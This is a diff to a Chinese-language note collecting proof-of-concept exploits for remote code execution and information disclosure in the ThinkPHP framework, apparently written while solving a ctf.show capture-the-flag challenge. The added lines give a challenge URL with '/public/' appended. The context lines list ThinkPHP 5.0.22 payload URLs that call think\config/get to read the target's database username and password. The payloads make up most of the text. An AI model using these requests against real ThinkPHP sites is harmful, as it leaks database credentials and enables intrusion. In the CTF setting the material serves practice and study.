@@ -1,6 +1,10 @@
 ## **Thinkphp RCE　POC大全**
 在 Vulhub 中，也可以找到了该漏洞的利用 POC
 一般也可以用工具一把梭
+输入路径加上public
+```
+http://5cffd11c-0f8a-46c7-8b5f-cdfde62cc85c.challenge.ctf.show/public/
+```
 **Thinkphp 5.0.22 POC**
 1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
 2. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password`
